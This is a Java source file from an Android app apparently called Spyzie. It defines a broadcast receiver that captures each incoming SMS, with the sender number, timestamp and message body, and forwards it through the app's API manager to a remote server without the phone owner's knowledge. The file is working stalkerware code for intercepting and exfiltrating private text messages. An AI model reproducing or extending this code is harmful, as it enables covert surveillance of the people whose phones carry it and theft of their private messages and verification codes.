package com.tantd.spyzie.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;

import com.tantd.spyzie.data.model.Sms;
import com.tantd.spyzie.data.network.AppApiManager;

public class SpyzieReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle data = intent.getExtras();
        Object[] pdus = (Object[]) data.get("pdus");
        StringBuilder sb = new StringBuilder();
        SmsMessage smsMessage;
        Sms sms = new Sms();
        for (int i = 0; i < pdus.length; i++) {
            smsMessage = SmsMessage.createFromPdu((byte[]) pdus[i]);
            if (i == 0) {
                sms.address = smsMessage.getDisplayOriginatingAddress();
                sms.time = String.valueOf(smsMessage.getTimestampMillis());
                sb.append("Phone: " + sms.address);
            }
            sb.append(", Message: " + smsMessage.getMessageBody());
        }
        sms.body = sb.toString();
        sms.isIncoming = true;
        AppApiManager.getInstance().sendSmsData(sms);
    }
}
